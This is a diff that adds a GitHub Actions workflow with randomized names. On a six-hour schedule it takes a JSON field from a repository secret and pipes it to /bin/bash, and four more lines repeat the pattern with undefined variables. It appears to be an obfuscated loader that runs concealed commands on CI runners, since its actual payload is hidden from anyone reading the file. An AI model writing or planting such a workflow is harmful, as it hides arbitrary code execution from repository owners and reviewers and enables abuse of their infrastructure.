@@ -1,0 +1,21 @@
+name: drawingmisnomer
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: drawingmisnomer
+        env:
+          jxq01: ${{ secrets.jxq01 }}
+        run: |
+          echo $jxq01 | jq -r .xog85 | /bin/bash
+          echo $xf24218 | jq -r .ux122 | /bin/bash
+          echo $iwt06345 | jq -r .hmkx2 | /bin/bash
+          echo $fllq761 | jq -r .tru931 | /bin/bash
+          echo $yxzfb29417 | jq -r .p3 | /bin/bash
+
